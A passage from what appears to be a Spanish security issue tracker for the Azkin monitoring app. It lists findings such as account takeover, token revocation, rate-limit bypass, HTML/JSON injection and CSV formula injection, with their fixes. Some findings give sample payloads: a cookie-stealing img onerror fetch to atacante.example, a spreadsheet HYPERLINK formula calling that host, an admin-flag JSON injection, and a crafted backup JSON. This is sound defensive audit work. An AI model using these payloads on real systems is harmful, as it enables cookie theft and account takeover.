TLS implicito vs. STARTTLS, no la validacion del certificado). El comentario en el codigo dice
"Permite auto-firmados en testing", pero el codigo corre igual en produccion.

Esto es inconsistente con el resto del propio proyecto: `smtp-mailer.ts` (el correo transaccional,
ej. reset de contraseña) **no** desactiva la validacion — usa el default seguro de nodemailer
(`rejectUnauthorized: true`) — y el proyecto ya tiene establecido el patron correcto para este tipo
de bypass explicito y opcional: `monitor.ignoreTls` en los monitores HTTP (`http.checker.ts`), que
es un opt-in visible por Admin, no un bypass incondicional y oculto.

**Escenario de explotacion:** un Admin configura un canal de email con `smtpSecure: true` apuntando
a un relay real (ej. el SMTP corporativo de su organizacion), asumiendo que la conexion esta
autenticada/cifrada de punta a punta. Un atacante en el camino de red entre el backend de Azkin y
ese host SMTP (router comprometido, AP Wi-Fi malicioso, DNS hijack del hostname SMTP) puede
presentar cualquier certificado autofirmado/invalido y la conexion se acepta igual — permitiendo
interceptar los correos de alerta (que incluyen nombres de monitores, URLs y detalle de estado) o
alterar/descartar silenciosamente su entrega.

### Comportamiento esperado

1. El envio de alertas por email valida el certificado TLS del servidor SMTP por defecto, igual que
   ya hace `smtp-mailer.ts` para el correo transaccional.
2. Si en algun momento se necesita soportar un relay SMTP con certificado autofirmado, existe un
   campo explicito y visible para el Admin en la configuracion del canal (mismo patron que
   `ignoreTls` en monitores HTTP) — nunca un bypass incondicional y oculto en el codigo.

### Criterios de aceptacion

1. `MultichannelNotifier.sendEmail()` ya no pasa `tls: { rejectUnauthorized: false }` de forma
   incondicional — el default es validar el certificado.
2. (Opcional, si se decide soportar relays autofirmados) La configuracion del canal de email
   (`EmailConfig`) expone un campo booleano explicito (ej. `smtpIgnoreTls`) que el Admin activa a
   sabiendas, documentado como riesgo, igual que `ignoreTls` en monitores.

### Pistas de investigacion

- `backend/src/infrastructure/notifier/multichannel-notifier.ts:179-187` (`sendEmail()`, el
  transporte con el bypass).
- `backend/src/infrastructure/notifier/smtp-mailer.ts:29-35` (patron correcto ya existente en el
  mismo proyecto, sin bypass, para comparar).
- `backend/src/infrastructure/checkers/http.checker.ts` (`monitor.ignoreTls`) como referencia del
  patron de opt-in explicito y visible por Admin, si se decide soportar el caso de uso legitimo de
  relays SMTP autofirmados.

---

## AZ-053) Toma de cuentas ajenas: import de backup acepta un passwordHash arbitrario, y "resetear contraseña de Admin" no valida que el id sea realmente un Admin

- Codigo: AZ-053
- Estado: [x] Resuelto (2026-07-27)
- Prioridad: Alta
- Reportado: 2026-07-24

### Progreso (2026-07-27)

Corregidos ambos vectores. (1) `import-backup.usecase.ts`: `passwordHash` ahora debe tener forma
de hash bcrypt real (regex `^\$2[aby]\$\d{2}\$.{53}$`) en ambos schemas; `importAdmins` ya no
sobrescribe el `passwordHash` de un admin ya existente durante un import — solo lo hace para
cuentas nuevas (`importViewers` ya no lo hacía). El resultado de import reporta ahora
`passwordsSkipped` por sección para que el Admin note qué cuentas conservaron su contraseña
original (surfaced en `/settings` → Respaldos). (2) `resetAdminPassword`
(`user.controller.ts`) verifica explícitamente `target.role === "admin"` antes de aplicar el
cambio (404 si no), cerrando el IDOR hacia Viewers de cualquier Admin. Cubierto con tests nuevos
(`import-backup.usecase.test.ts`, `user.controller.test.ts`). Suite completa 268/268.

### Descripcion

Auditoria de seguridad ampliada (segunda ronda, 5 agentes en paralelo sobre auth, RBAC/IDOR,
cripto, inyeccion e infraestructura). Dos rutas distintas terminan en el mismo problema: un Admin
puede tomar el control de OTRA cuenta (Admin o Viewer, incluso de otro Admin) sin conocer ni probar
la contraseña actual.

**1) Import de backup — `backend/src/application/use-cases/backup/import-backup.usecase.ts`.**
`backupAdminSchema`/`backupViewerSchema` (lineas 37-54) solo exigen `passwordHash: z.string().min(1)`
— cualquier string pasa, no se valida que sea un hash bcrypt real ni que el archivo provenga de un
export legitimo de esta misma instancia (sin firma/HMAC). `importAdmins` (lineas 141-160): si ya
existe un admin con ese email, llama `this.users.changePassword(existingId, data.passwordHash)`
directo — sin pedir la contraseña actual, sin reautenticacion. Mismo patron en `importViewers`
(lineas 165-214). La ruta `POST /api/v1/backup/import` (`backup.routes.ts:11`) solo exige
`requireRole("admin")` — cualquier cuenta Admin, no una en particular.
Ejemplo de explotacion: subir `{"admins":[{"email":"otro-admin@empresa.com","passwordHash":"$2b$10$<hash de una contraseña elegida por el atacante>"}]}` sobrescribe silenciosamente la contraseña de ese admin.

**2) `PUT /api/v1/users/admins/:id/password` — `backend/src/infrastructure/http/controllers/user.controller.ts:134-154`.**
`resetAdminPassword` toma `id = req.params.id` y llama directo a
`this.usersRepo.changePassword(id, passwordHash)`. Verificado en
`mongoose-user.repository.ts:50-56`: `changePassword` hace
`UserModel.updateOne({ _id: id }, { passwordHash })` **sin filtro de `role` ni de `adminId`** — a
diferencia de todos sus metodos hermanos (`setAdminBlocked`, `deleteAdmin`,
`updateAdminEmail`, que si filtran por `role:"admin"`, y `findViewerById`/`updateViewerPermissions`/
`deleteViewer`, que filtran por `role:"viewer", adminId`). Como resultado, un Admin puede pasarle a
este endpoint (pensado para resetear la contraseña de OTRO ADMIN) el id de un **Viewer que pertenece
a un Admin distinto**, y el reset se aplica igual — saltandose por completo el aislamiento por
`adminId` que el resto del codigo sí respeta para Viewers. Los ids de Viewer son ObjectIds de 24
caracteres visibles/enumerables desde otros endpoints (audit log, asignacion masiva de canales, etc.).

### Comportamiento esperado

1. Importar un backup nunca sobrescribe la contraseña de una cuenta ya existente sin alguna prueba
   de legitimidad (firma del archivo contra un secreto propio de la instancia que lo genero, o un
   flujo separado de "forzar reset" explicito y auditado, no un cambio silencioso).
2. `PUT /users/admins/:id/password` solo puede aplicarse a una cuenta con `role:"admin"` — nunca a
   un Viewer, y mucho menos a un Viewer de otro Admin.

### Criterios de aceptacion

1. `ImportBackupUseCase` rechaza o marca como advertencia explicita cualquier intento de
   sobrescribir el `passwordHash` de una cuenta ya existente, salvo que el backup tenga alguna forma
   de autenticidad verificable.
2. `changePassword` (o un metodo nuevo dedicado) filtra por `role:"admin"` cuando lo invoca
   `resetAdminPassword`, igual que ya hacen `setAdminBlocked`/`deleteAdmin`/`updateAdminEmail`.
3. Test de regresion: `resetAdminPassword` con el id de un Viewer (de cualquier Admin) devuelve 404,
   no 200.

### Pistas de investigacion

- `backend/src/application/use-cases/backup/import-backup.usecase.ts:37-54,126-163`
- `backend/src/infrastructure/http/controllers/user.controller.ts:134-154`
- `backend/src/infrastructure/persistence/mongoose/repositories/mongoose-user.repository.ts:50-56`
  (comparar con `setAdminBlocked`/`deleteAdmin`/`updateAdminEmail`/`findViewerById` en el mismo
  archivo para ver el patron correcto ya usado en otros metodos).
- Nota de contexto: `spec/03-modelo-datos.md` §8 dice que los Admins no tienen aislamiento entre si
  para Viewers, lo cual contradice el aislamiento por `adminId` que si esta implementado en
  `findAllViewers`/`findViewerById`/`updateViewerPermissions`/`deleteViewer` — vale la pena resolver
  esa contradiccion de una vez (decidir cual es el modelo real) al corregir este punto.

---

## AZ-054) Sin revocacion de sesion: bloquear/eliminar un usuario o cambiarle permisos no invalida sus tokens ya emitidos, y el token de acceso es intercambiable por el de refresh

- Codigo: AZ-054
- Estado: [x] Resuelto (2026-07-27)
- Prioridad: Alta
- Reportado: 2026-07-24

### Progreso (2026-07-27)

1. **Revocación por `isBlocked` en cada request:** `makeAuthGuard` (`auth-guard.ts`) ahora recibe
   `IUserRepository` y, tras verificar la firma del JWT, hace `findById(userId)` y rechaza con
   `UnauthorizedError` si la cuenta no existe o está bloqueada — mismo criterio "mínimo" que pide
   el propio criterio de aceptación. Bloquear/eliminar una cuenta corta su acceso en la siguiente
   request, sin esperar a que el token expire solo.
2. **Claim `typ` en el JWT:** `ITokenService.sign()`/`verify()` ganaron un parámetro
   `type: "access" | "refresh"` (`security.ts`, `jwt-token-service.ts`); `verify(token,
   expectedType)` rechaza el token si su claim `typ` no coincide. `auth-guard.ts` exige `"access"`,
   `RefreshUseCase` exige `"refresh"`. **Nota de despliegue:** los tokens ya emitidos antes de este
   cambio no tienen claim `typ` y quedan invalidados — todas las sesiones activas se cierran al
   desplegar esta versión (login/refresh vuelven a funcionar de inmediato, solo hay que
   reautenticarse una vez).
3. **Duración TV/Kiosko:** se extrajo el literal `31536000` a la constante
   `TV_SESSION_EXPIRES_IN_SECONDS` (documentada en `login.usecase.ts`) — se mantiene en 1 año (no se
   redujo) porque el punto 1 ya cubre la revocación anticipada que antes faltaba.

Cubierto con tests nuevos (`auth-guard.test.ts`, `jwt-token-service.test.ts`) y actualización de
los existentes (`login.usecase.test.ts`, `refresh.usecase.test.ts`, `register.usecase.test.ts`,
`socketio.gateway.ts` también exige `"access"`). Suite completa 268/268.

### Descripcion

`makeAuthGuard` (`backend/src/infrastructure/http/middlewares/auth-guard.ts:10-28`), que corre en
**cada** request protegido, solo hace `tokens.verify(token)` — sin ningun lookup a la base de datos.
`isBlocked` solo se revisa en `LoginUseCase` (`login.usecase.ts:55`) y `RefreshUseCase`
(`refresh.usecase.ts:30`), nunca en un request comun. Consecuencia: bloquear una cuenta, cambiarle
la contraseña, o reducirle los permisos a un Viewer no invalida los tokens que esa cuenta ya tiene
en uso — siguen funcionando hasta que expiran solos. Para sesiones normales son hasta 2h
(`AZKIN_JWT_EXPIRES_IN`), pero para sesiones TV/Kiosko (`login.usecase.ts:67`,
`refresh.usecase.ts:36`) son **31536000 segundos = 1 año**.

Ademas, `JwtTokenService.sign()` (`backend/src/infrastructure/security/jwt-token-service.ts:18-21`)
genera el token de acceso y el de refresh con exactamente la misma forma de payload
(`{sub, role, adminId, permissions}`), sin ningun claim `typ`/`purpose` que los distinga. Verificado
en `refresh.usecase.ts:24`: `RefreshUseCase` llama al mismo `tokens.verify()` generico que usa el
auth guard — no discrimina "esto es un refresh token". Consecuencia: un refresh token filtrado (7
dias, o 1 año en TV) funciona directo como Bearer de acceso en cualquier endpoint protegido; y un
access token (2h) puede presentarse en `POST /auth/refresh` para obtener un refresh token nuevo de
larga duracion, extendiendo la ventana de un access token robado mas alla de su expiracion original.

### Comportamiento esperado

1. Bloquear, eliminar o degradar los permisos de una cuenta corta su acceso de forma practicamente
   inmediata, no recien cuando el token expira solo.
2. Un token de acceso no puede usarse como refresh token, ni viceversa.

### Criterios de aceptacion

1. Existe algun mecanismo de revocacion (verificacion de `isBlocked`/existencia en escrituras
   sensibles como minimo, o un `tokenVersion`/denylist) que corta el acceso de una cuenta bloqueada
   sin esperar la expiracion natural del token.
2. Los tokens llevan un claim `typ: "access" | "refresh"` y tanto el auth guard como
   `RefreshUseCase` lo validan explicitamente, rechazando el tipo equivocado.
3. Se reevalua la duracion de 1 año para sesiones TV/Kiosko a la luz de que hoy no hay forma de
   revocarlas antes de tiempo.

### Pistas de investigacion

- `backend/src/infrastructure/http/middlewares/auth-guard.ts:10-28`
- `backend/src/infrastructure/security/jwt-token-service.ts` (agregar el claim `typ` en `sign()` y
  validarlo en `verify()`, o exponer un `verify(token, expectedType)`).
- `backend/src/application/use-cases/auth/{login,refresh}.usecase.ts` (duracion de sesion TV, uso
  actual de `isBlocked`).

---

## AZ-055) El rate limiter anti fuerza-bruta de login/reset/enrollment es evadible: el backend queda expuesto en todas las interfaces y confia en `X-Forwarded-For`

- Codigo: AZ-055
- Estado: [x] Resuelto (2026-07-27)
- Prioridad: Alta
- Reportado: 2026-07-24

### Progreso (2026-07-27)

`compose.dev.yaml`: los puertos del backend (`AZKIN_BACK_PORT`, `AZKIN_HTTPS_PORT`) se publican
enlazados a `127.0.0.1`, mismo patrón que ya usaba Mongo (en dev el dev-server de Angular necesita
llegar al backend directo, ver §5).

`compose.yaml` (producción) va un paso más allá tras una consulta del usuario sobre un despliegue
de 3 máquinas donde solo el frontend debe ser alcanzable: el bloque `ports:` del servicio
`backend` queda **comentado por defecto**, sin publicar nada al host — `azkin-db`/`azkin-back`/
`azkin-front` ya se hablan entre sí por nombre de servicio dentro de `azkin-network` (nginx →
`http://backend:3000`), lo cual nunca requirió un puerto publicado. Publicar solo hacía falta para
acceso *externo* a esa red (depuración directa, un scraper de Prometheus, un integrador de la API
pública) — casos opcionales, no el camino feliz. El bloque queda documentado y listo para
descomentar (enlazado a `127.0.0.1`, no a todas las interfaces) para quien sí lo necesite. Esto de
paso resuelve choques de puerto en hosts con muchos servicios Docker corriendo, ya que por defecto
no se reserva ningún puerto para el backend. Documentado en `docs/instalacion-docker.md` (§9 tabla
de problemas frecuentes y §12 tabla de puertos, ambas actualizadas) y en `.env.example`. No se
tocó `trust proxy: 1` en `composition-root.ts` — sigue siendo correcto una vez que nginx es la
única forma de llegar al backend desde la red.

### Descripcion

`backend/src/composition-root.ts:219` — `app.set("trust proxy", 1)`: Express deriva `req.ip` del
header `X-Forwarded-For`, asumiendo que **todo** trafico pasa primero por nginx (que es quien
deberia fijar ese header de forma confiable). Pero `compose.yaml:45` publica el puerto del backend
como `"${AZKIN_BACK_PORT:-3000}:3000"` — **sin** el prefijo `127.0.0.1:` que si tiene Mongo
explicitamente (`compose.yaml:24`, con un comentario propio justificando por que Mongo se restringe
asi). El puerto del backend, en cambio, queda publicado en todas las interfaces por defecto.

El limitador de fuerza bruta (`backend/src/infrastructure/http/middlewares/rate-limit.ts`, aplicado
a `/login`, `/forgot-password`, `/reset-password` en `auth.routes.ts:12-17`, y a
`/federation/enrollments` en `federation.routes.ts:25,33`) usa el `keyGenerator` por defecto de
`express-rate-limit`, que es `req.ip`. Como ese valor viene de un header que el cliente controla en
cuanto se conecta directo al puerto 3000 (sin pasar por nginx), un atacante puede mandar un
`X-Forwarded-For` distinto en cada request y obtener un cupo de 10 intentos nuevo cada vez —
neutralizando por completo el limite en login, en el consumo de tokens de reset de contraseña, y en
el consumo de tokens de enrollment de federacion.

### Comportamiento esperado

1. El puerto plano del backend no es alcanzable directamente desde fuera del host salvo que el
   operador lo exponga a proposito — el trafico publico pasa siempre por nginx.
2. El rate limiting de los endpoints sensibles no puede evadirse falsificando cabeceras.

### Criterios de aceptacion

1. `compose.yaml`/`compose.dev.yaml` enlazan el puerto del backend a `127.0.0.1` por defecto (mismo
   patron que ya usa Mongo), dejando `AZKIN_BACK_PORT` para depuracion local, no para exposicion
   publica directa.
2. Documentado en `docs/instalacion-docker.md` que el unico punto de entrada publico soportado es
   nginx (puerto 80/443), y que exponer el backend directo rompe el rate limiting.

### Pistas de investigacion

- `compose.yaml:41-45`, `compose.dev.yaml:37-40` (comparar con el binding de Mongo en
  `compose.yaml:24`).
- `backend/src/composition-root.ts:219` (`trust proxy`).
- `backend/src/infrastructure/http/middlewares/rate-limit.ts`.

---

## AZ-056) El token de recuperacion de contraseña se loguea en texto plano cuando no hay SMTP configurado

- Codigo: AZ-056
- Estado: [x] Resuelto (2026-07-27)
- Prioridad: Alta
- Reportado: 2026-07-24

### Progreso (2026-07-27)

`smtp-mailer.ts` (`logMock`) ahora redacta cualquier `token=<hex>` de query string y cualquier
token hexadecimal suelto de 32+ caracteres (el formato exacto que usa
`request-password-reset.usecase.ts`) antes de loguear el cuerpo del correo — el envío real por SMTP
no cambia, solo el modo mock. Además, `env.ts` agrega un warning de arranque (mismo patrón que
`AZKIN_CORS_ORIGIN=*`) cuando `AZKIN_SMTP_HOST`/`USER`/`PASSWORD` están incompletos, indicando que
los correos (incluido el de reset) van a modo log salvo que se configure un canal de notificación
tipo Email como fuente de SMTP.

### Descripcion

`backend/src/application/use-cases/auth/request-password-reset.usecase.ts` arma el email de reset
con el token/link **sin hashear** y lo pasa a `mailer.send(...)`. Todos los campos
`AZKIN_SMTP_*` son opcionales (`env.ts:49-54`) — si no estan completos, o si el envio falla,
`SmtpMailer.send()` (`backend/src/infrastructure/notifier/smtp-mailer.ts:19-27,55-59`) cae en
silencio a `logMock(input)`, que hace `logger.warn(\`[SMTP MOCK] Mensaje:\n${input.text}\`)` —
imprimiendo el email completo, **con el token de reset valido**, a stdout/`docker logs`. A
diferencia del caso `AZKIN_CORS_ORIGIN=*` (que si dispara una advertencia de arranque, `env.ts:139-141`),
no hay ningun aviso de que SMTP no esta configurado y que los tokens de reset van a parar al log.

### Comportamiento esperado

1. El token de recuperacion de contraseña nunca aparece en texto plano en los logs, con o sin SMTP
   configurado.
2. Si SMTP no esta configurado, el operador recibe una advertencia clara al arrancar (mismo patron
   que ya existe para CORS).

### Criterios de aceptacion

1. El modo mock de `SmtpMailer` redacta el token/link antes de loguear el cuerpo del correo.
2. Existe una advertencia de arranque cuando `AZKIN_SMTP_*` esta incompleto, indicando que
   password-reset y otros correos degradan a modo log.

### Pistas de investigacion

- `backend/src/infrastructure/notifier/smtp-mailer.ts:19-27,55-59`
- `backend/src/application/use-cases/auth/request-password-reset.usecase.ts:36-51`
- `backend/src/infrastructure/config/env.ts:49-54,139-141` (patron de advertencia ya usado para CORS).

---

## AZ-057) Cambiar la propia contraseña no exige la contraseña actual

- Codigo: AZ-057
- Estado: [x] Resuelto (2026-07-27)
- Prioridad: Media
- Reportado: 2026-07-24

### Progreso (2026-07-27)

`changeOwnPassword` (`user.controller.ts`) ahora exige `currentPassword` en el body y lo valida
contra el hash guardado (`hasher.compare`) antes de aplicar el cambio — 401 si no coincide, 400 si
no se envía. Se agregó también el registro de auditoría (`OWN_PASSWORD_CHANGE`) que antes faltaba
en este método. Frontend: el formulario "Cambiar Contraseña" en `/profile` agrega el campo
"Contraseña Actual" y lo envía junto al resto. Cubierto en `user.controller.test.ts`.

### Nota (2026-07-27) — bug real encontrado por el usuario al probar: el toast de error no mostraba el motivo real

Reporte del usuario probando el modal "Cambiar Contraseña" de un Viewer: "el botón no funciona o
si funciona nunca sé si cambió la clave o no". Causa raíz: `resetAdminPassword`/
`changeOwnPassword`/`changeViewerPassword` (mismo archivo, afecta también AZ-053/AZ-066.3)
respondían sus validaciones con `res.json({ error: "mensaje" })` armado a mano — un envelope
distinto al `{ error: { code, message } }` que produce `errorHandler` para el resto de la API. El
frontend (`extractApiErrorMessage`) solo sabe leer ese segundo formato, así que cualquier rechazo
de estos 3 endpoints (password débil, cuenta no encontrada, contraseña actual incorrecta) mostraba
siempre el toast genérico de fallback en vez del motivo real — más fácil de disparar tras subir la
exigencia de la política de contraseña (letra + número) en esta misma ronda. Corregido: los 3
métodos (y `updatePreferences`, mismo patrón) ahora lanzan `ValidationError`/`NotFoundError`/
`UnauthorizedError`, que `errorHandler` traduce correctamente. Cubierto con un test end-to-end
(controller → `errorHandler`) en `user.controller.test.ts`. Suite completa 269/269.

### Descripcion

`PUT /api/v1/users/profile/password` (`user.routes.ts:31`) →
`changeOwnPassword` (`backend/src/infrastructure/http/controllers/user.controller.ts:176-190`):
cualquier usuario autenticado puede cambiar su propia contraseña mandando solo `newPassword` (≥8
caracteres) — sin verificar `currentPassword` en ningun punto del flujo. Un token de acceso expuesto
brevemente (XSS, log filtrado, sesion abierta en un equipo compartido/kiosko) alcanza para tomar
control permanente de la cuenta sin haber conocido nunca la contraseña original.

### Comportamiento esperado

Cambiar la propia contraseña exige probar la contraseña actual (o un segundo factor equivalente),
igual que ya exige el flujo de reset por token para quien no la recuerda.

### Criterios de aceptacion

1. `changeOwnPassword` recibe y valida `currentPassword` contra el hash guardado (`hasher.compare`)
   antes de aplicar el cambio; responde 401/400 si no coincide.

### Pistas de investigacion

- `backend/src/infrastructure/http/controllers/user.controller.ts:176-190`
- `backend/src/infrastructure/security/bcrypt-password-hasher.ts` (`compare()` ya existe y se usa en
  login).

---

## AZ-058) Inyeccion HTML en el email de informes periodicos, e inyeccion JSON en el payload de webhooks de notificacion

- Codigo: AZ-058
- Estado: [x] Resuelto (2026-07-27)
- Prioridad: Media
- Reportado: 2026-07-24

### Progreso (2026-07-27)

(1) `buildSummaryHtml()` (`send-report-email.usecase.ts`) escapa entidades HTML (`&amp; &lt; &gt;
&quot; &#39;`) en `definitionName` y en `monitorName` del Top de indisponibilidad antes de
interpolarlos. (2) `renderTemplate()` (`template-renderer.ts`) ganó un tercer parámetro opcional
`escapeValue` (default `String`, sin cambio de comportamiento para quien no lo pase);
`MultichannelNotifier.sendWebhook()` lo usa con un escape JSON-string
(`JSON.stringify(v).slice(1,-1)`) al renderizar el body del canal webhook, así que un valor con
comillas/backslashes ya no rompe el JSON efectivamente enviado. `sendSlack`/`sendDiscord` no
cambiaron (ya eran seguros). Cubierto con tests nuevos (`send-report-email.usecase.test.ts`,
`multichannel-notifier.test.ts`).

### Descripcion

**1) HTML sin escapar en el email de informes.** `buildSummaryHtml()` en
`backend/src/application/use-cases/reports/send-report-email.usecase.ts:42-71` interpola
`data.definitionName` y `row.monitorName` (ambos sin restriccion de caracteres en su schema Zod)
directo dentro de un string HTML, sin ninguna funcion de escape en todo el archivo. Ese HTML se
manda como `html:` del correo (`smtp-mailer.ts:41`) a la lista de destinatarios del informe. Como
los monitores son un pool global (sin aislamiento entre Admins), cualquier Admin puede nombrar un
monitor `&lt;img src=x onerror="fetch('https://atacante.example/c?x='+document.cookie)"&gt;` y ese
HTML llega intacto al cliente de correo de cualquier destinatario del informe la proxima vez que se
genere — a diferencia de los correos de alerta UP/DOWN/DEGRADADO, que sí van en texto plano
(`multichannel-notifier.ts:193`) y no tienen este problema.

**2) JSON armado por sustitucion de texto en el webhook por defecto.** La plantilla webhook por
defecto (`backend/src/infrastructure/notifier/default-templates.ts:16-21`) es un
`JSON.stringify({...})` con placeholders `{{var}}` como *valores* dentro del JSON ya serializado.
`renderTemplate` (`template-renderer.ts`) hace un `.replace()` de texto plano sobre ese string,
sustituyendo el valor real **sin escapar comillas ni backslashes**. Un nombre de monitor con una
comilla doble (`Bob's "prod" server`, o algo deliberado como
`test","admin":true,"x":"y`) rompe o adultera el JSON que efectivamente se envia al webhook
configurado — a diferencia de Slack/Discord, que sí arman el payload con `JSON.stringify` sobre un
objeto real en el momento del envio (`multichannel-notifier.ts:79-109`), evitando el problema.

### Comportamiento esperado

1. Ningun valor controlado por un Admin (nombre de monitor, nombre de informe) puede alterar la
   estructura HTML del email de informes ni la estructura JSON del webhook por defecto.

### Criterios de aceptacion

1. `buildSummaryHtml()` escapa entidades HTML (`&amp; &lt; &gt; &quot; &#39;`) en todo valor
   interpolado.
2. El body del canal tipo webhook se arma poblando un objeto real y aplicando `JSON.stringify()` en
   el momento del envio (o, como minimo, `renderTemplate` escapa comillas/backslashes al sustituir
   valores dentro de un JSON ya serializado).

### Pistas de investigacion

- `backend/src/application/use-cases/reports/send-report-email.usecase.ts:42-71`
- `backend/src/infrastructure/notifier/default-templates.ts:16-21`,
  `backend/src/infrastructure/notifier/template-renderer.ts` (`renderTemplate`)
- `backend/src/infrastructure/notifier/multichannel-notifier.ts:79-150` (comparar `sendSlack`/
  `sendDiscord`, que si son seguros, contra `sendWebhook`).

---

## AZ-059) Exportacion CSV vulnerable a inyeccion de formulas (CSV/Excel injection)

- Codigo: AZ-059
- Estado: [x] Resuelto (2026-07-27)
- Prioridad: Media
- Reportado: 2026-07-24

### Progreso (2026-07-27)

`escapeCsv()` en `dashboard.ts` (`downloadEventsCsv`) ahora antepone un `'` a cualquier celda que
empiece con `= + - @` antes de aplicar el escape de comillas/comas ya existente. Se confirmó que
`downloadCsvTemplate()` en `backups-panel.ts` (la otra exportación CSV del proyecto) es contenido
100% estático sin datos de usuario interpolados, así que no aplica este fix.

### Descripcion

`escapeCsv()` en `frontend/src/app/features/dashboard/dashboard.ts:1509` solo entrecomilla celdas
que contienen `"`, `,` o salto de linea — no neutraliza celdas que empiezan con `=`, `+`, `-` o `@`,
los prefijos clasicos de inyeccion de formulas reconocidos por Excel/Google Sheets. Los campos
exportados (`r.monitorName`, `r.target`, `r.msg`) no tienen restriccion de caracteres. Un monitor
nombrado `=HYPERLINK("http://atacante.example/robar?x="&amp;A1,"abrir")` termina en el CSV exportado
tal cual, y ejecuta como formula si un Admin lo abre en Excel/Sheets.

### Comportamiento esperado

Un valor de celda que empiece con `= + - @` se neutraliza (prefijo `'` o envoltura equivalente)
antes de exportar, ademas del escape de comillas/comas ya existente.

### Criterios de aceptacion

1. `escapeCsv()` (y cualquier otro exportador CSV del proyecto) neutraliza el prefijo de formula
   antes de aplicar el resto del escape.

### Pistas de investigacion

- `frontend/src/app/features/dashboard/dashboard.ts:1508-1524` (`downloadEventsCsv`, `escapeCsv`).

---

## AZ-060) El backup descargable expone los password hash de TODOS los Admins/Viewers y la clave privada TLS a cualquier Admin

- Codigo: AZ-060
- Estado: [~] Mayormente resuelto (2026-07-27) — documentado; reautenticación y enmascarado deliberadamente diferidos
- Prioridad: Media
- Reportado: 2026-07-24

### Progreso (2026-07-27)

Se implementó solo el criterio mínimo: `docs/instalacion-docker.md` §8 ahora documenta
explícitamente que un backup completo es una "bóveda de credenciales" (password hashes de todos
los Admin/Viewer + clave privada TLS + secretos de notificación en texto plano) que debe tratarse
con el mismo cuidado que el acceso a Mongo/`.env`. **Los criterios "deseable" (reautenticación
antes de crear/descargar) y "enmascarar secretos de notificación en el backup" se dejan
deliberadamente sin implementar:** un backup completo existe justamente para poder restaurar la
instancia íntegra tras un desastre — enmascarar los secretos de notificación en el payload
exportado rompería la restauración real (no habría forma de recuperar el `webhookUrl`/`botToken`
real), y el "sin aislamiento entre Admins" es una decisión de arquitectura ya documentada del
proyecto (`spec/03-modelo-datos.md` §8), no un bug de esta issue. Si en el futuro se quiere
reautenticación antes de descargar, es una mejora acotada e independiente que puede abordarse por
separado sin tocar el formato del backup.

### Descripcion

`CreateBackupUseCase` (`backend/src/application/use-cases/backup/create-backup.usecase.ts:49-70`)
empaqueta el `passwordHash` de **todos** los admins y viewers, la clave privada TLS activa
(`keyPemEncrypted`), y la configuracion de canales de notificacion (sin enmascarar secretos, a
diferencia de `UpdateNotificationUseCase`) en un solo archivo. `ListBackupsUseCase`/
`GetBackupUseCase` no aplican ningun filtro de propiedad — cualquier cuenta Admin (incluida una
creada hace 5 segundos por otro Admin) puede listar y descargar cualquier backup y quedarse con el
dump completo de hashes de contraseña + material de clave privada de toda la instancia. Es
consistente con el modelo "sin aislamiento entre Admins" que ya aplica a monitores, pero el radio de
impacto (credenciales + clave privada de TODA la instancia, no solo "ver un monitor ajeno") es
categoricamente distinto.

### Comportamiento esperado

Descargar o generar un backup completo (que incluye hashes de contraseña y la clave privada TLS)
requiere una confirmacion reforzada (reingreso de contraseña) y/o queda documentado como una
capacidad de alto privilegio para operadores.

### Criterios de aceptacion

1. (Minimo) Documentado explicitamente en `docs/ARCHITECTURE.md`/`instalacion-docker.md` el radio de
   impacto de un backup para que el operador lo trate como boveda de credenciales.
2. (Deseable) Reautenticacion (contrasena actual) exigida antes de crear/descargar un backup
   completo.
3. Los secretos de canales de notificacion se enmascaran en el backup igual que ya se enmascaran en
   la API normal (`UpdateNotificationUseCase`), salvo en el campo especifico usado para restaurar.

### Pistas de investigacion

- `backend/src/application/use-cases/backup/{create-backup,get-backup,list-backups}.usecase.ts`
- `backend/src/infrastructure/http/routes/backup.routes.ts:9-16`

---

## AZ-061) Las API keys son equivalentes a un Admin completo, sin poder acotarlas a monitores o grupos especificos

- Codigo: AZ-061
- Estado: [~] Mayormente resuelto (2026-07-27) — aviso en UI agregado; scoping por monitor diferido
- Prioridad: Media
- Reportado: 2026-07-24

### Progreso (2026-07-27)

Se implementó el criterio mínimo: `api-keys-panel.ts` (`/settings` → **API**) ahora muestra un
aviso explícito de que una API Key equivale a acceso total de Admin sobre todos los monitores del
pool, no acotado a un subconjunto. **El criterio "deseable" (acotar una key a monitores/grupos
específicos) se deja deliberadamente diferido:** requiere agregar un campo nuevo a `IApiKey`, su
persistencia Mongoose, el schema Zod, *y* nueva lógica de autorización en los use-cases de
escritura de monitores (`CreateMonitorUseCase`/`UpdateMonitorUseCase`/`DeleteMonitorUseCase`/
`BulkDeleteMonitorsUseCase`, que hoy no filtran por permiso ni siquiera para Viewers) — una feature
nueva de tamaño comparable a una issue propia, no un fix acotado.

### Descripcion

`makeApiKeyAuth` (`backend/src/infrastructure/http/middlewares/api-key-auth.ts:35-38`) fija
`req.userRole = "admin"` y `req.permissions = []` para cualquier API key valida — la unica
restriccion es el scope grueso `read`/`write` contra el metodo HTTP. `composition-root.ts:659`
monta `/api/public/v1/monitors` con el **mismo** router que usan los Admins autenticados por sesion,
asi que una API key "write" puede crear/editar/borrar/borrado-masivo **cualquier** monitor del pool
global, y una "read" puede listar/exportar todos (incluyendo credenciales SNMP en texto plano, ver
AZ-062). No existe forma de acotar una API key a un subconjunto de monitores como si se puede con
los permisos de un Viewer.

### Comportamiento esperado

El panel de creacion de API keys deja claro que una key con scope "write" equivale a acceso total de
Admin sobre monitores (no acotado), o se agrega la capacidad de acotarla a monitores/grupos
especificos.

### Criterios de aceptacion

1. (Minimo) La UI de creacion de API keys (`api-keys-panel.ts`) muestra una advertencia explicita de
   que el scope no esta limitado a monitores propios — es acceso total al pool.
2. (Deseable) Las API keys admiten una lista opcional de monitores/grupos permitidos, aplicada igual
   que `filterMonitorsByPermission` para Viewers.

### Pistas de investigacion

- `backend/src/infrastructure/http/middlewares/api-key-auth.ts:35-38`
- `backend/src/composition-root.ts:659` (montaje de `/api/public/v1/monitors`).
- `frontend/src/app/features/settings/api-keys-panel.ts` (para el aviso en UI).

---

## AZ-062) Las credenciales SNMP nunca se enmascaran: visibles para Viewers con permiso sobre un solo monitor, y en texto plano en el log de auditoria

- Codigo: AZ-062
- Estado: [x] Resuelto (2026-07-27)
- Prioridad: Media
- Reportado: 2026-07-24

### Progreso (2026-07-27)

`toMonitorResponse()`/`toGroupOverviewResponse()` (`monitor.presenter.ts`) ahora reciben el `role`
del requester: un Admin sigue viendo `snmpCommunity`/`snmpV3AuthKey`/`snmpV3PrivKey` en texto plano
(los necesita para editar el monitor), cualquier otro rol los recibe enmascarados vía la
